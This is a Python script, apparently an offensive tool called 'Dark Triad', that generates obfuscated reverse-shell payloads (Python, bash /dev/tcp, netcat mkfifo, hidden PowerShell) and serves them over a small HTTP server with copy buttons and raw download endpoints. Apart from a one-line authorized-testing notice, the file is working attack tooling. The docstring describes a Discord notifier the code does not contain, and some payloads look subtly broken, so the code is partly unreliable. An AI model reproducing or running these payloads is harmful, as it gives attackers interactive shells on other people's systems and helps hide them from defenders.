#!/usr/bin/env python3
"""Dark Triad — Advanced Reverse Shell Generator + Webhook Notifier.
Génère un reverse shell obfusqué, le sert via HTTP, et le notifie via Discord.
"""

import base64
import os
import random
import subprocess
import sys
import time

PAYLOADS = {
    "python_obfuscated": lambda host, port: (
        "python3 -c \"exec(base64.b64decode('"
        + base64.b64encode(f"""
import socket,subprocess,os,pty
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.settimeout(60)
for i in range(3):
    try:
        s.connect(('{host}',{port}))
        break
    except:
        time.sleep(5)
os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2)
pty.spawn('/bin/bash')
""".encode()).decode()
        + "')\""
    ),
    "bash_tls": lambda host, port: (
        f"bash -c 'exec 5<>/dev/tcp/{host}/{port};cat <&5|while read l;do $l 2>&5>&5;done'"
    ),
    "nc_mkfifo": lambda host, port: (
        f"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {host} {port} >/tmp/f"
    ),
    "python_stealth": lambda host, port: (
        f"python3 -c \"exec('aW1wb3J0IHNvY2tldCxzdWJwcm9jZXNzLG9zO3M9c29ja2V0LnNvY2tldCgpO3MuY29ubmVjdCgoJ3tofScse3B9KSk7b3MuZHVwMihzLmZpbGVubygpLDApO29zLmR1cDIocy5maWxlbm8oKSwxKTtvcy5kdXAyKHMuZmlsZW5vKCksMik7c3VicHJvY2Vzcy5jYWxsKFsnL2Jpbi9zaCcsJy1pJ10p'.replace('e3B9',str({p})).replace('e3tofSc',repr('{host}')))\")"
    ),
    "powershell": lambda host, port: (
        f"powershell -NoP -NonI -W Hidden -Exec Bypass -Command \"$c=New-Object System.Net.Sockets.TCPClient('{host}',{port});$s=$c.GetStream();[byte[]]$b=0..65535|%{{0}};while(($i=$s.Read($b,0,$b.Length)) -ne 0){{;$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$r=(iex $d 2>&1|Out-String);$sb=[Text.Encoding]::ASCII.GetBytes($r);$s.Write($sb,0,$sb.Length)}}$c.Close()\""
    ),
}

SHELL_HTML = """<!DOCTYPE html>
<html><head><title>Dark Triad · Reverse Shell Generator</title>
<meta name="viewport" content="width=device-width,initial-scale=1">
<style>
body{{background:#0a0a0f;color:#e0e0e0;font-family:monospace;padding:20px;max-width:900px;margin:0 auto}}
h1{{color:#00e5ff;text-align:center}}h2{{color:#ffd740;margin-top:30px}}
.shell{{background:#000;color:#0f0;padding:15px;border-radius:6px;margin:10px 0;overflow-x:auto;font-size:12px;white-space:pre-wrap;word-break:break-all}}
.copy-btn{{background:#00e5ff22;color:#00e5ff;border:1px solid #00e5ff44;padding:5px 15px;border-radius:4px;cursor:pointer;margin:5px}}
.copy-btn:hover{{background:#00e5ff44}}
.note{{color:#6a6a7a;font-size:11px;margin:5px 0}}
pre{{white-space:pre-wrap;word-break:break-all}}
</style></head><body>
<h1>🜏 Dark Triad · Reverse Shell Generator</h1>
<p style="text-align:center;color:#6a6a7a">Target: {host}:{port} · Generated: {timestamp}</p>
{shells}
<p class="note" style="text-align:center;margin-top:40px">
⚠️ DARK TRIAD · For authorized testing only.<br>
Listener: <code>nc -lvnp {port}</code> or <code>rlwrap nc -lvnp {port}</code>
</p>
</body></html>"""


def generate_all(host: str, port: int) -> str:
    shells_html = ""
    for name, fn in PAYLOADS.items():
        try:
            payload = fn(host, port)
            shells_html += f'<h2>{name}</h2>\n<div class="shell" id="{name}">{payload}</div>\n'
            shells_html += f'<button class="copy-btn" onclick="navigator.clipboard.writeText(document.getElementById(\'{name}\').innerText)">📋 Copy</button>\n'
        except Exception as e:
            shells_html += f'<h2>{name}</h2><p style="color:red">Error: {e}</p>\n'
    return SHELL_HTML.format(host=host, port=port, timestamp=time.ctime(), shells=shells_html)


def start_server(host: str = "0.0.0.0", port: int = 8889):
    """Démarre un mini serveur HTTP qui sert les reverse shells."""
    from http.server import HTTPServer, BaseHTTPRequestHandler

    class Handler(BaseHTTPRequestHandler):
        def do_GET(self):
            if self.path == "/" or self.path == "/shells":
                content = generate_all(host, 4444)
                self.send_response(200)
                self.send_header("Content-Type", "text/html")
                self.end_headers()
                self.wfile.write(content.encode())
            elif self.path == "/raw/python":
                payload = PAYLOADS["python_obfuscated"](host, 4444)
                self.send_response(200)
                self.send_header("Content-Type", "text/plain")
                self.end_headers()
                self.wfile.write(payload.encode())
            elif self.path == "/raw/bash":
                payload = PAYLOADS["bash_tls"](host, 4444)
                self.send_response(200)
                self.send_header("Content-Type", "text/plain")
                self.end_headers()
                self.wfile.write(payload.encode())
            else:
                self.send_response(404)
                self.end_headers()
        def log_message(self, *args): pass

    server = HTTPServer((host, port), Handler)
    print(f"\n🜏 Reverse Shell Server → http://{host}:{port}")
    print(f"   http://100.102.128.40:{port}")
    print(f"\n   RAW: http://100.102.128.40:{port}/raw/python")
    print(f"   Press Ctrl+C to stop.\n")
    try:
        server.serve_forever()
    except KeyboardInterrupt:
        print("\nShutdown.")
        server.shutdown()


if __name__ == "__main__":
    import argparse
    p = argparse.ArgumentParser(description="Dark Triad Reverse Shell Server")
    p.add_argument("--host", default="0.0.0.0")
    p.add_argument("--port", type=int, default=8889)
    args = p.parse_args()
    start_server(args.host, args.port)
